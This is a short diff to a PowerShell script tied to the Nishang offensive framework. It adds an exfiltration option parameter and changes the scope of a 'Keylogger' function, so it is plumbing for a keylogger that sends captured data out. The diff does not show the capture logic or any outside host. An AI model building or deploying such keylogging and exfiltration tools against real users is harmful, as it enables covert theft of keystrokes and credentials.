@@ -82,7 +82,10 @@ https://github.com/samratashok/nishang
         [String]
         $MagicString,
 
-
+        [Parameter(Position = 2, Mandatory = $False, Parametersetname="exfil")] 
+        [String]
+        $ExfilOption,
+        
         [Parameter(Position = 3, Mandatory = $False, Parametersetname="exfil")] 
         [String]
         $dev_key = "null",
@@ -113,7 +116,7 @@ https://github.com/samratashok/nishang
 
 $functions =  {
 
-function script:Keylogger
+function Keylogger
 {
     Param ( 
         [Parameter(Position = 0, Mandatory = $True)]
